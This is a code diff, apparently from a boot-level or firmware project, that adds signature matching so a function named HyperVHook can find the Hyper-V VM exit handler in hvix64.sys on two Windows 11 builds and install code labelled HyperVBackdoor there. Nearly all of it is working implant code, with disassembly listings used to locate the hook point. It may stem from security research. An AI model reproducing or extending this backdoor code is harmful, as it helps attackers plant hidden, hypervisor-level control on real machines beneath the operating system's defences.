@@ -645,6 +645,74 @@ VOID *HyperVHook(VOID *Image)
                     HookLen = 5;
                     Version = 19045;
                 }
+                /*
+                    Match hvix64.sys VM exit handler signature for Windows 11 21H2:
+
+                        ...
+
+                        .text:FFFFF8000023E372      mov     [rsp+arg_20], rcx
+                        .text:FFFFF8000023E377      mov     rcx, [rsp+arg_18]
+                        .text:FFFFF8000023E37C      mov     rcx, [rcx]
+                        .text:FFFFF8000023E37F      mov     [rcx], rax
+                        .text:FFFFF8000023E382      mov     [rcx+10h], rdx
+                        
+                        ...
+
+                        .text:FFFFF8000023E3B2      mov     [rcx+78h], r15
+                        .text:FFFFF8000023E3B6      mov     rax, [rsp+arg_20]
+                        .text:FFFFF8000023E3BB      mov     [rcx+8], rax
+                        .text:FFFFF8000023E3BF      lea     rax, [rcx+70h]
+                        
+                        ...
+
+                        .text:FFFFF8000023E479      mov     edx, esi
+                        .text:FFFFF8000023E47B      or      edx, [rsp+arg_28]
+                        .text:FFFFF8000023E47F      call    sub_FFFFF80000221D30
+                */
+                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
+                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 &&
+                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
+                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
+                         *(Func + 0x10d) == 0xe8)
+                {
+                    Func = (UINT8 *)JUMP32_ADDR(Func + 0x10d);
+                    HookLen = 5;
+                    Version = 22000;
+                }
+                /*
+                    Match hvix64.sys VM exit handler signature for Windows 11 22H2:
+
+                        ...
+
+                        .text:FFFFF8000023C313      mov     [rsp+arg_20], rcx
+                        .text:FFFFF8000023C318      mov     rcx, [rsp+arg_18]
+                        .text:FFFFF8000023C31D      mov     rcx, [rcx]
+                        .text:FFFFF8000023C320      mov     [rcx], rax
+                        .text:FFFFF8000023C323      mov     [rcx+10h], rdx
+                    
+                        ...
+
+                        .text:FFFFF8000023C353      mov     [rcx+78h], r15
+                        .text:FFFFF8000023C357      mov     rax, [rsp+arg_20]
+                        .text:FFFFF8000023C35C      mov     [rcx+8], rax
+                        .text:FFFFF8000023C360      lea     rax, [rcx+70h]
+                    
+                        ...
+
+                        .text:FFFFF8000023C418      mov     edx, esi
+                        .text:FFFFF8000023C41A      or      edx, [rsp+arg_28]
+                        .text:FFFFF8000023C41E      call    sub_FFFFF80000216D20
+                */
+                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
+                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 &&
+                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
+                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
+                         *(Func + 0x10b) == 0xe8)
+                {
+                    Func = (UINT8 *)JUMP32_ADDR(Func + 0x10b);
+                    HookLen = 5;
+                    Version = 22621;
+                }
                 else
                 {
                     Func = NULL;
@@ -656,6 +724,7 @@ VOID *HyperVHook(VOID *Image)
                     UINTN CodeLen = (UINTN)&HyperVBackdoorEnd - (UINTN)&HyperVBackdoor;
                     PHVBD_DATA BackdoorData = (PHVBD_DATA)(Buff + HVBD_DATA_ADDR);
 
+                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V version is %d\r\n", Version);
                     DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V VM exit handler is at "FPTR"\r\n", Func);
                     DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Backdoor code size is %d bytes\r\n", CodeLen);
 
